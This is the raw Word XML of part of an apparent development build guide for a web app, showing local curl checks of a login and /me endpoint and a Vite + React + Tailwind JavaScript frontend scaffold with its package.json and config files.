            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -i http://localhost:3000/api/v1/me</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → 401 {"error":{"code":"UNAUTHORIZED","message":"Missing Bearer token"...}}</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Login first, capture accessToken</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>LOGIN=$(curl -s -X POST http://localhost:3000/api/v1/auth/login \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        -H 'Content-Type: application/json' \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        -d '{"employee_id":"SA79900","password":"SA79900"}')</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>ACCESS=$(echo "$LOGIN" | python -c "import sys,json;print(json.load(sys.stdin)['data']['accessToken'])")</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With valid Bearer → 200 + user payload</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -i http://localhost:3000/api/v1/me -H "Authorization: Bearer $ACCESS"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → {"data":{"employeeId":"SA79900","userId":1,"role":"SUPER_ADMIN","permissions":[...]}}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part VII  ·  STEP 6  ·  Frontend Scaffold (JavaScript)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Goal: a Vite + React + Tailwind 3 frontend that renders a canary page styled with the 11 locked design tokens. Every component is .jsx; every config is .js. Zero TypeScript anywhere.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FEF3C7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="B45309"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="B45309"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">IMPORTANT  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Brief history of this step</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>The first attempt at STEP 6 used TypeScript (because the build doc had .tsx examples).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>DS interrupted and asked to wipe the FE folder and restart in pure JavaScript.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Memory entry feedback-javascript-only was created so this never happens again.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Every byte of FE code below is the JS rebuild.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>7.1  Folder Structure</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tree</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>FE/src/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── main.jsx</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── App.jsx</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── components/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>│   ├── Brand.jsx</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>│   └── ui/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>│       ├── Badge.jsx</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>│       ├── Button.jsx</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>│       ├── FormField.jsx</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>│       ├── Input.jsx</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>│       └── Spinner.jsx</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>└── styles/globals.css</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>7.2  package.json (FE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Critical absences vs Phase 4's first TS attempt: no @types/*, no typescript, no tsconfig*.json scripts.</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package.json</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>{</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "name": "cmcmis-fe",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "private": true,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "version": "1.0.0",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "type": "module",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "scripts": {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "dev":     "vite",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "build":   "vite build",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "preview": "vite preview --port 4173"</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"dependencies": {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "@hookform/resolvers": "^3.9.0",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "axios": "^1.7.7", "clsx": "^2.1.1",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "lucide-react": "^0.454.0",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "react": "^18.3.1", "react-dom": "^18.3.1",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "react-hook-form": "^7.53.0",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "react-router-dom": "^6.27.0",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "zod": "^3.23.0"</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"devDependencies": {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "@tailwindcss/forms": "^0.5.9",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "@vitejs/plugin-react": "^4.3.2",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "autoprefixer": "^10.4.20",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "postcss": "^8.4.47",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "tailwindcss": "^3.4.13",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "vite": "^5.4.8"</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w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>7.3  vite.config.js — /api proxy + path alias</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vite.config.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { defineConfig } from 'vite';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import react from '@vitejs/plugin-react';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import path from 'node:path';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { fileURLToPath } from 'node:url';</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const __filename = fileURLToPath(import.meta.url);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const __dirname  = path.dirname(__filename);</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export default defineConfig({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  plugins: [react()],</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  resolve: { alias: { '@': path.resolve(__dirname, './src') } },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  server: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    port: 5173, strictPort: true,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    proxy: { '/api': { target: 'http://localhost:3000', changeOrigin: true } },</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build: { sourcemap: true, target: 'es2020', outDir: 'dist', emptyOutDir: true },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>});</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>7.4  tailwind.config.js — 11 Design Tokens</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Single source of truth for every color. Component code references tokens by name (bg-base, text-ink, border-border, bg-accent hover:bg-accent-hover); raw hex literals anywhere else are a design-system violation.</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tailwind.config.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import forms from '@tailwindcss/forms';</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@type {import('tailwindcss').Config} */</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>export default {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  content: ['./index.html', './src/**/*.{js,jsx}'],</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  theme: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
